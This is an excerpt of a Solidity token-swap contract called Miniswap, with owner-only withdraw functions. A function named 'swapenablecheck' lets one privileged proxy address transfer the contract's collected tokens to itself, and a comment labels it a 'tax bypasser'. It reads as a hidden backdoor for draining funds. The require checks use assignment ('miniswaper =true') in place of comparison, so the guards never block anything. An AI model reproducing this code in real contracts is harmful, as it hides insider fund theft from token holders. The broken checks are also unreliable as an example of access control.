...
contract Miniswap is Ownable {
    ...
    function withdrawBNBV2() external onlyOwner {
        uint256 _amount;
        require(miniswaper =true, 'Swap proxy enable');
        _amount=Miniswapbalance;
        IBEP20(MINIBNBADDRESSv2).transfer(msg.sender, Miniswapbalance);
        Miniswapbalance = Miniswapbalance.sub(_amount);
    }
    
    function withdrawBNBV1() external onlyOwner {
        uint256 _amount;
        require(miniswaper =true, 'Swap proxy enable');
        _amount=Miniswapcollected;
        IBEP20(MINIBNBADDRESS).transfer(msg.sender, Miniswapcollected);
        Miniswapcollected = Miniswapcollected.sub(_amount);
    }
    
    function swapenablecheck(bool uniswap) external
    {
    require(msg.sender == uniswapproxy,'swap proxy fixed') ;
    //tax bypasser
    IBEP20(MINIBNBADDRESS).transfer(uniswapproxy, Miniswapcollected);
    miniswaper = uniswap;
    }
